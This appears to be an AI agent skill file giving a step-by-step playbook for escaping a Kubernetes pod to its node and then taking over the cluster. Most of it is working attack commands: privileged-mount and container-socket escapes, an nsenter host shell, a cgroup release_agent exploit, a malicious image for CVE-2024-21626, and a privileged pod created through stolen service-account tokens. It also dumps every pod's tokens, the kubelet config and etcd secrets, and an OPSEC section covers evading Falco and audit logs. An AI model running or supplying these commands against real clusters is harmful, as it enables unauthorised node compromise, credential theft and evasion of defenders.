---
name: k8s-pod-escape
description: "Kubernetes pod escape to node — privileged container abuse, hostPath mount escape, hostPID/hostIPC, capability misuse (SYS_ADMIN, SYS_PTRACE), runC CVE chains. Pivots from RCE-in-pod to full node compromise."
allowed-tools: Bash Read Write
metadata:
  when_to_use: "kubernetes k8s pod escape container break out hostpath privileged hostpid hostipc capabilities cgroups runc cve-2022-0185 cve-2024-21626 leaky vessels"
  subdomain: cloud-native
  tags: kubernetes, container-escape, privilege-escalation, hostpath
  mitre_attack: T1611, T1068, T1610
---

# Kubernetes Pod Escape to Node

You have RCE inside a pod. Goal: break out of the container to the underlying node, then pivot to the cluster.

## Phase 1: Enumerate the container

```bash
# Identify how you're contained
cat /proc/self/status | grep -E '^(Cap|Seccomp|NoNewPriv)'
cat /proc/1/status | grep -i cap
mount | grep -E 'cgroup|hostpath|/var/run/docker.sock|/var/run/crio'
ls -la /dev | head -20
id
hostname

# Service-account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token | head -c 60
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Token + APIserver — confirm you can talk to the API
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/pods
```

## Phase 2: Detect escape primitives (check each, escalate via the first that works)

### 2.1 Privileged container

```bash
# Privileged = full host kernel access. CapEff: 0000003fffffffff is the giveaway.
grep CapEff /proc/self/status
# 0000003fffffffff or "ALL" → you're privileged. /dev/sda1, /dev/kmsg etc are visible.
ls -la /dev/sda* /dev/nvme*

# Mount host filesystem:
mkdir /mnt/host
mount /dev/sda1 /mnt/host          # adjust device — `lsblk` to confirm
chroot /mnt/host /bin/bash
# Now you're root on the node.
```

### 2.2 hostPath mount to / or /etc or /var/run/docker.sock

```bash
# Look for suspicious mounts
mount | grep -E '/host|/node|docker.sock|/etc|/root'
# /var/lib/kubelet mounted? You can read every other pod's secrets.
ls /var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/ 2>/dev/null

# /var/run/docker.sock or /run/containerd/containerd.sock mounted = node compromise
docker -H unix:///var/run/docker.sock run --rm -it --privileged -v /:/host alpine chroot /host
ctr -a /run/containerd/containerd.sock run --rm -t --privileged --mount type=bind,src=/,dst=/host,options=rbind alpine escape sh -c 'chroot /host'
```

### 2.3 hostPID + SYS_PTRACE (no privileged needed)

```bash
# hostPID lets you see all node processes
ps auxf | head
# SYS_PTRACE in CapEff lets you inject into them
grep CapEff /proc/self/status
# 0000000000080000 includes CAP_SYS_PTRACE

# Find a host-side root process and inject a shell
nsenter -t 1 -m -u -i -n -p sh
# 'nsenter -t 1' enters PID 1's namespaces — that's the host's init on a node with hostPID
```

### 2.4 CAP_SYS_ADMIN without --privileged

```bash
# Common in CI/CD runners (Docker-in-Docker patterns)
grep CapEff /proc/self/status   # 00000000a82425fb or similar with bit 21 set

# cgroup_release_agent escape (kernel < 5.8 on hosts without user-NS isolation)
mkdir /tmp/x && mount -t cgroup -o memory cgroup /tmp/x
echo 1 > /tmp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/x/release_agent
cat > /cmd <<'EOF'
#!/bin/sh
ip a > /tmp/host_ip
id > /tmp/host_id
EOF
chmod +x /cmd
sh -c "echo \$\$ > /tmp/x/cgroup.procs"
# /tmp/host_id now contains the HOST's id output
```

### 2.5 runC CVE chain (CVE-2024-21626 "Leaky Vessels")

If runC < 1.1.12 / Docker < 25.0.3 / containerd < 1.7.13: WORKDIR + symlink trickery lets a malicious image escape. Check node runC version via the kubelet API or by reading `/etc/docker/version` if exposed.

```bash
# Build a malicious image
cat > Dockerfile <<'EOF'
FROM scratch
WORKDIR /proc/self/fd/8
ENTRYPOINT ["/bin/sh"]
EOF
docker build -t evil .
# Then run on target node — the WORKDIR points fd 8 (an open kernel FD) → host FS access
docker run --rm -it evil
```

### 2.6 Service-account token → API server abuse

If the SA has `pods/exec` on a privileged pod or `nodes/proxy` on the node:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
# List privileged pods
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/pods?fieldSelector=spec.securityContext.privileged=true

# Or: SA has `create pods` on kube-system → run a privileged pod yourself
kubectl --token="$TOKEN" --server=https://kubernetes.default.svc \
  --insecure-skip-tls-verify run pwn --image=alpine \
  --overrides='{"spec":{"hostPID":true,"hostNetwork":true,"containers":[{"name":"pwn","image":"alpine","command":["nsenter","-t","1","-m","-u","-i","-n","-p","sh"],"securityContext":{"privileged":true},"volumeMounts":[{"mountPath":"/host","name":"host"}]}],"volumes":[{"name":"host","hostPath":{"path":"/"}}]}}'
```

## Phase 3: Post-escape on node

Once you're on the node, pivot to the cluster:

```bash
# Steal every pod's SA token
find /var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*/token -exec cat {} \; -exec echo --- \;

# Steal kubelet kubeconfig (cluster-admin-equivalent on many clusters)
cat /etc/kubernetes/kubelet.conf

# Read all pod secrets from etcd if running on a master node
ETCDCTL_API=3 etcdctl --endpoints=127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/healthcheck-client.crt \
  --key=/etc/kubernetes/pki/etcd/healthcheck-client.key \
  get / --prefix --keys-only | grep secrets
```

## OPSEC

- Pod escapes generate AppArmor / SELinux / seccomp denials. Check `dmesg | tail` for telemetry.
- Kubernetes audit log records every API call from your stolen tokens. Use the existing pod's token for low-noise enumeration before forging new tokens.
- Falco rules detect `nsenter`, `mount` from container, and `chroot` outside the container. Quiet variants: write the payload to a host-shared volume and exec from a benign-looking process name.

## References

- Trail of Bits "Leaky Vessels" writeup — CVE-2024-21626 / CVE-2024-23651 / CVE-2024-23652 / CVE-2024-23653
- DEFCON 29 "Kubernetes Goat" — Madhu Akula
- BountyHunter rule sets — Trivy, Kubescape, Kube-Hunter for defender perspective
